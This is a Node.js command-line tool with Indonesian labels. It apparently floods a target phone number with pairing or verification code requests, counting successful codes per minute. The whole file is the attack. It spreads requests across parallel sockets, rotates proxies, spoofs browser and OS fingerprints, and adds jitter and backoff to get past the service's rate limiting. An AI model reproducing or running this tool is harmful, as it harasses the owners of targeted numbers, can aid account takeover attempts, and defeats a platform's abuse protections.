#!/usr/bin/env node
import { Command } from 'commander'
import fs from 'node:fs'
import { requestCode, classify } from './src/pair.js'
import { normalizePhone } from './src/phone.js'
import { ProxyPool } from './src/proxies.js'

const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
const jitter = (ms) => Math.floor(ms * (0.7 + Math.random() * 0.6))

const program = new Command()
program
  .requiredOption('-p, --phone <nomor>', 'nomor target (08xx / +62xx / 62xx)')
  .option('-n, --count <n>', 'total request', '100')
  .option('-c, --concurrency <n>', 'socket paralel', '6')
  .option('-d, --delay <ms>', 'jeda antar attempt per worker', '1500')
  .option('-t, --timeout <ms>', 'timeout per attempt', '25000')
  .option('-r, --retries <n>', 'retry per request', '3')
  .option('--cooldown <ms>', 'backoff dasar saat kena rate limit', '6000')
  .option('--proxy <file>', 'file daftar proxy (satu per baris)')
  .option('--os <os>', 'fingerprint OS: ubuntu|macOS|windows|android', 'ubuntu')
  .option('--browser <name>', 'fingerprint browser', 'Chrome')
  .option('-o, --out <file>', 'simpan hasil JSONL')
  .option('--verbose', 'log setiap hasil', false)
  .option('--dry-run', 'hanya validasi nomor', false)
  .parse()

const o = program.opts()
const phone = normalizePhone(o.phone)
const total = parseInt(o.count, 10)
const concurrency = Math.min(parseInt(o.concurrency, 10), total)
const delayMs = parseInt(o.delay, 10)
const retries = parseInt(o.retries, 10)
const cooldown = parseInt(o.cooldown, 10)
const timeout = parseInt(o.timeout, 10)

console.log(`target     : ${phone}`)
console.log(`request    : ${total} | paralel: ${concurrency} | delay: ${delayMs}ms`)
if (o.dryRun) process.exit(0)

const proxies = ProxyPool.fromFile(o.proxy)
if (proxies.enabled) console.log(`proxy      : ${proxies.items.length} entri`)
else console.log('proxy      : tidak dipakai (semua request dari IP Anda)')

const out = o.out ? fs.createWriteStream(o.out, { flags: 'a' }) : null
const stats = { ok: 0, RATE_LIMIT: 0, TIMEOUT: 0, NETWORK: 0, RESTART: 0, ERROR: 0, gaveUp: 0 }
const codes = new Set()
const startedAt = Date.now()

let cursor = 0
let active = 0
let stopping = false
let pausedUntil = 0
let rateStreak = 0

const record = (obj) => out?.write(JSON.stringify({ ts: Date.now(), ...obj }) + '\n')

async function task(i) {
  let attempt = 0
  while (!stopping) {
    while (Date.now() < pausedUntil) await sleep(250)
    if (stopping) return
    attempt++
    const proxy = proxies.pick()
    try {
      const { code } = await requestCode({
        phone,
        proxy: proxy?.url,
        timeoutMs: timeout,
        browserOs: o.os,
        browserName: o.browser
      })
      proxies.ok(proxy)
      rateStreak = 0
      stats.ok++
      codes.add(code)
      record({ i, attempt, ok: true, code, proxy: proxy?.url ?? null })
      if (o.verbose) console.log(`#${i}  OK  ${code}`)
      break
    } catch (e) {
      const kind = classify(e)
      if (kind === 'NETWORK' || kind === 'TIMEOUT') proxies.fail(proxy)
      stats[kind] = (stats[kind] || 0) + 1
      record({ i, attempt, ok: false, kind, msg: String(e?.message ?? e).slice(0, 200), proxy: proxy?.url ?? null })

      if (kind === 'RATE_LIMIT') {
        rateStreak++
        pausedUntil = Date.now() + jitter(cooldown * Math.min(rateStreak, 6))
        if (o.verbose) console.log(`#${i}  429 — jeda ${Math.round((pausedUntil - Date.now()) / 1000)}s`)
      }

      if (attempt > retries) {
        stats.gaveUp++
        if (o.verbose) console.log(`#${i}  MENYERAH (${kind})`)
        break
      }
      await sleep(jitter(delayMs * attempt))
    }
  }
}

async function worker() {
  while (!stopping) {
    const i = ++cursor
    if (i > total) return
    active++
    await task(i)
    active--
    if (i < total && delayMs) await sleep(jitter(delayMs))
  }
}

process.on('SIGINT', () => {
  if (stopping) process.exit(1)
  stopping = true
  console.log('\n[!] dihentikan, menutup socket...')
})

const ticker = setInterval(() => {
  const el = (Date.now() - startedAt) / 1000
  const done = stats.ok + stats.gaveUp
  process.stdout.write(
    `\r  jalan ${el.toFixed(0)}s | sukses ${stats.ok} | 429 ${stats.RATE_LIMIT} | gagal ${stats.gaveUp} | ${(stats.ok / Math.max(el, 1) * 60).toFixed(1)} kode/menit   `
  )
}, 1000)

await Promise.all(Array.from({ length: concurrency }, worker))
clearInterval(ticker)
stopping = true
out?.end()

const elapsed = (Date.now() - startedAt) / 1000
console.log('\n\n=== RINGKASAN ===')
console.log(`durasi        : ${elapsed.toFixed(1)}s`)
console.log(`sukses        : ${stats.ok}`)
console.log(`kode unik     : ${codes.size}`)
console.log(`429           : ${stats.RATE_LIMIT}`)
console.log(`timeout/net   : ${stats.TIMEOUT} / ${stats.NETWORK}`)
console.log(`error lain    : ${stats.ERROR + stats.RESTART}`)
console.log(`menyerah      : ${stats.gaveUp}`)
console.log(`laju efektif  : ${(stats.ok / Math.max(elapsed, 1) * 60).toFixed(1)} kode/menit`)
if (proxies.enabled) console.log(`proxy mati    : ${proxies.stats().dead}/${proxies.stats().total}`)